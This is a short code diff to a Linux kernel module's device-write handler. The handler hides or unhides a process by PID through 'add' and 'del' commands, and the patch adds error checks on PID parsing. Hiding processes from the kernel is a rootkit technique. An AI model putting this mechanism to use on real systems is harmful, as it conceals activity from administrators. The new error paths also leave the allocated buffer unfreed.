@@ -170,6 +170,7 @@ static ssize_t device_write(struct file *filep,
                             size_t len,
                             loff_t *offset)
 {
+    int ret;
     long pid;
     char *message;
 
@@ -181,11 +182,17 @@ static ssize_t device_write(struct file *filep,
     memset(message, 0, len + 1);
     copy_from_user(message, buffer, len);
     if (!memcmp(message, add_message, sizeof(add_message) - 1)) {
-        kstrtol(message + sizeof(add_message), 10, &pid);
-        hide_process(pid);
+	ret = kstrtol(message + sizeof(add_message), 10, &pid);
+	if (!ret)
+	    hide_process(pid);
+	else
+	    return ret;
     } else if (!memcmp(message, del_message, sizeof(del_message) - 1)) {
-        kstrtol(message + sizeof(del_message), 10, &pid);
-        unhide_process(pid);
+        ret = kstrtol(message + sizeof(del_message), 10, &pid);
+        if (!ret)
+	    unhide_process(pid);
+	else
+	    return ret;
     } else {
         kfree(message);
         return -EAGAIN;
